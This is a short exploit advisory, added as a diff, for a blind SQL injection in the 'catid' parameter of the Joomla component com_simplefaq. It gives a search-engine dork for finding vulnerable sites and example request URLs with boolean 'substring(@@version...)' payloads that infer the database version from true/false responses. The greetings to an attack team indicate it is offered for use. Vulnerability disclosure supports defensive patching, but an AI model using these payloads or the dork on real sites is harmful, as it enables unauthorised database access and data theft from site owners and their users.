@@ -1,0 +1,32 @@
+Joomla Component com_simplefaq (catid) Blind Sql Injection Vulnerability
+=========================================================================
+
+###########################################
+.:. Author : AtT4CKxT3rR0r1ST
+.:. Team : Sec Attack Team
+.:. Email : F.Hack@w.cn
+.:. Home : www.sec-attack.com/vb
+.:. Script : Joomla Component com_simplefaq
+.:. Script Download: http://www.parkviewconsultants.com/component/option,com_mosipn/page,free/
+.:. Bug Type : Blind Sql Injection
+.:. Dork : inurl:"com_simplefaq"
+#############################################
+
+===[ Exploit ]===
+
+www.site.com/index.php?option=com_simplefaq&func=display&Itemid=49&catid=70[Blind Injection]&page=1#FAQ5
+
+www.site.com/index.php?option=com_simplefaq&func=display&Itemid=49&catid=70+and substring(@@version,1,1)=5&page=1#FAQ5 >>>> True
+
+www.site.com/index.php?option=com_simplefaq&func=display&Itemid=49&catid=70+and substring(@@version,1,1)=4&page=1#FAQ5 >>>> False
+
+
+===[ Example ]===
+
+http://server/index.php?option=com_simplefaq&func=display&Itemid=49&catid=70+and substring(@@version,1,1)=5&page=1#FAQ5 >>>> True
+
+http://server/index.php?option=com_simplefaq&func=display&Itemid=49&catid=70+and substring(@@version,1,1)=4&page=1#FAQ5 >>>> False
+
+#############################################
+
+Greats T0: HackxBack & Zero Cold & All My Friend & All Member Sec Attack
